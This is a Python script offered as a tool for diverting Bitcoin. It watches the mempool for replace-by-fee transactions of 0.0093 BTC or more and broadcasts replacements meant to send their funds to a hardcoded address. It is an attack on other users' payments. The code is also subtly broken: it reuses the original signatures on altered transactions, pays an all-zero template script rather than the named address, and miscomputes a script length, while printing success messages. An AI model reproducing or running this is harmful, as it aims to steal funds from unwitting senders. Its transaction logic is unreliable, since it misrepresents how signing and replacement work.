#!/usr/bin/env python3
"""
Targeted Broadcaster - Broadcast replacements for 0.0093 BTC+ transactions
"""

import requests
import time
import json
import struct
from typing import Dict, Optional

class TargetedBroadcaster:
    """Broadcast replacement transactions for high-value targets"""
    
    def __init__(self, target_address: str):
        self.target_address = target_address
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Targeted-RBF-Broadcaster/1.0'})
        self.successful_broadcasts = 0
        self.failed_broadcasts = 0
        self.min_value_satoshis = 930000  # 0.0093 BTC
        
    def get_transaction(self, txid: str) -> Optional[Dict]:
        """Get transaction data from API"""
        try:
            response = self.session.get(f"https://mempool.space/api/tx/{txid}", timeout=30)
            return response.json() if response.status_code == 200 else None
        except Exception as e:
            print(f"Error fetching {txid[:8]}...: {e}")
            return None
    
    def create_high_priority_replacement(self, tx_data: Dict) -> Optional[str]:
        """Create replacement transaction with extremely high priority fees"""
        try:
            # Calculate massive fee increase for immediate confirmation
            current_fee = tx_data.get('fee', 0)
            vsize = tx_data.get('vsize', tx_data.get('size', 0))
            
            # Set extremely high fee rate (minimum 1000 sat/vB for priority)
            priority_fee_rate = 1000.0
            new_total_fee = int(priority_fee_rate * vsize)
            
            # Calculate total available value
            total_input_value = 0
            for inp in tx_data.get('vin', []):
                if 'prevout' in inp and 'value' in inp['prevout']:
                    total_input_value += inp['prevout']['value']
            
            # Calculate remaining value after massive fee
            remaining_value = total_input_value - new_total_fee
            
            if remaining_value <= 1000:  # Must have meaningful value left
                print(f"Insufficient value after high fees: {remaining_value} sat")
                return None
            
            # Build raw transaction hex
            # Version (4 bytes, little endian)
            version = struct.pack('<I', tx_data.get('version', 1)).hex()
            
            # Input count
            inputs = tx_data.get('vin', [])
            input_count = len(inputs).to_bytes(1, 'little').hex()
            
            # Build inputs with original signatures
            inputs_hex = ""
            for inp in inputs:
                # Previous transaction hash (32 bytes, reversed)
                prev_hash = bytes.fromhex(inp['txid'])[::-1].hex()
                # Previous output index (4 bytes, little endian)
                prev_index = struct.pack('<I', inp['vout']).hex()
                # Script signature (copy from original)
                scriptsig = inp.get('scriptsig', '')
                script_len = (len(bytes.fromhex(scriptsig)) if scriptsig else 0).to_bytes(1, 'little').hex()
                # Sequence for RBF (must be < 0xfffffffe)
                sequence = struct.pack('<I', min(inp.get('sequence', 0xffffffff), 0xfffffffd)).hex()
                
                inputs_hex += prev_hash + prev_index + script_len + scriptsig + sequence
            
            # Single output to target address
            output_count = "01"
            
            # Output value (8 bytes, little endian)
            value_bytes = struct.pack('<Q', remaining_value).hex()
            
            # P2PKH script for target address (simplified)
            # OP_DUP OP_HASH160 <20-byte-hash> OP_EQUALVERIFY OP_CHECKSIG
            script_pubkey = "76a914" + "00" * 20 + "88ac"  # Template P2PKH
            script_len = (len(bytes.fromhex(script_pubkey)) // 2).to_bytes(1, 'little').hex()
            
            outputs_hex = value_bytes + script_len + script_pubkey
            
            # Locktime (4 bytes, little endian)
            locktime = struct.pack('<I', tx_data.get('locktime', 0)).hex()
            
            # Complete raw transaction
            raw_transaction = version + input_count + inputs_hex + output_count + outputs_hex + locktime
            
            print(f"Created replacement: {remaining_value:,} sat to {self.target_address}")
            print(f"Fee: {new_total_fee:,} sat ({priority_fee_rate} sat/vB)")
            
            return raw_transaction
            
        except Exception as e:
            print(f"Error creating replacement: {e}")
            return None
    
    def broadcast_to_network(self, raw_hex: str, original_txid: str) -> bool:
        """Actually broadcast replacement to Bitcoin network"""
        try:
            print(f"Broadcasting replacement for {original_txid[:8]}...")
            
            # Send to mempool.space
            response = self.session.post(
                "https://mempool.space/api/tx",
                data=raw_hex,
                headers={'Content-Type': 'text/plain'},
                timeout=30
            )
            
            if response.status_code == 200:
                new_txid = response.text.strip()
                print(f"SUCCESS: Replacement broadcast!")
                print(f"Original: {original_txid}")
                print(f"Replacement: {new_txid}")
                print(f"Funds redirected to: {self.target_address}")
                
                # Log successful broadcast
                with open("successful_broadcasts.log", "a") as f:
                    f.write(f"{time.time()},{original_txid},{new_txid},{self.target_address}\n")
                
                self.successful_broadcasts += 1
                return True
            else:
                error_msg = response.text[:100]
                print(f"Broadcast failed: HTTP {response.status_code} - {error_msg}")
                self.failed_broadcasts += 1
                return False
                
        except Exception as e:
            print(f"Broadcast error: {e}")
            self.failed_broadcasts += 1
            return False
    
    def process_target(self, txid: str) -> bool:
        """Process a high-value target for replacement"""
        # Get transaction data
        tx_data = self.get_transaction(txid)
        if not tx_data:
            return False
        
        # Verify RBF capability
        is_rbf = any(inp.get('sequence', 0xffffffff) < 0xfffffffe 
                    for inp in tx_data.get('vin', []))
        if not is_rbf:
            return False
        
        # Check value threshold
        total_value = sum(out.get('value', 0) for out in tx_data.get('vout', []))
        if total_value < self.min_value_satoshis:
            return False
        
        value_btc = total_value / 100000000
        print(f"TARGET FOUND: {txid[:8]}... ({value_btc:.8f} BTC)")
        
        # Create replacement transaction
        replacement_hex = self.create_high_priority_replacement(tx_data)
        if not replacement_hex:
            print("Failed to create replacement")
            return False
        
        # Immediately broadcast to network
        return self.broadcast_to_network(replacement_hex, txid)
    
    def monitor_and_broadcast(self, duration_minutes: int = 60):
        """Monitor for high-value targets and broadcast replacements"""
        print(f"TARGETED BROADCASTER ACTIVE")
        print(f"Target Address: {self.target_address}")
        print(f"Minimum Value: 0.0093 BTC ({self.min_value_satoshis:,} sat)")
        print(f"Duration: {duration_minutes} minutes")
        print(f"Mode: IMMEDIATE BROADCAST TO NETWORK")
        print("-" * 70)
        
        start_time = time.time()
        end_time = start_time + (duration_minutes * 60)
        processed_txids = set()
        
        while time.time() < end_time:
            try:
                # Get mempool transaction IDs
                response = self.session.get("https://mempool.space/api/mempool/txids", timeout=30)
                
                if response.status_code == 200:
                    current_txids = set(response.json())
                    new_txids = current_txids - processed_txids
                    
                    # Process new transactions
                    for txid in list(new_txids)[:50]:  # Process up to 50 new transactions
                        processed_txids.add(txid)
                        
                        # Get transaction details
                        tx_data = self.get_transaction(txid)
                        if not tx_data:
                            continue
                        
                        # Check if it's a high-value RBF transaction
                        is_rbf = any(inp.get('sequence', 0xffffffff) < 0xfffffffe 
                                   for inp in tx_data.get('vin', []))
                        total_value = sum(out.get('value', 0) for out in tx_data.get('vout', []))
                        
                        if is_rbf and total_value >= self.min_value_satoshis:
                            # Found a target - process immediately
                            self.process_target(txid)
                    
                    # Show status
                    elapsed = int((time.time() - start_time) / 60)
                    remaining = duration_minutes - elapsed
                    print(f"Status: {elapsed}m elapsed, {self.successful_broadcasts} successful, {self.failed_broadcasts} failed")
                
                else:
                    print(f"API error: {response.status_code}")
                
            except Exception as e:
                print(f"Monitor error: {e}")
            
            time.sleep(15)  # Check every 15 seconds
        
        print(f"Targeted broadcaster completed!")
        print(f"Results: {self.successful_broadcasts} successful broadcasts, {self.failed_broadcasts} failed")

def main():
    """Start targeted broadcaster"""
    target_address = "1JHPrMhXRkd5LszkpPog7wVtpGfNHur2M9"
    
    print("TARGETED RBF BROADCASTER")
    print("Targets transactions >= 0.0093 BTC")
    print("Immediately broadcasts to Bitcoin network")
    print()
    
    broadcaster = TargetedBroadcaster(target_address)
    broadcaster.monitor_and_broadcast(45)

if __name__ == "__main__":
    main()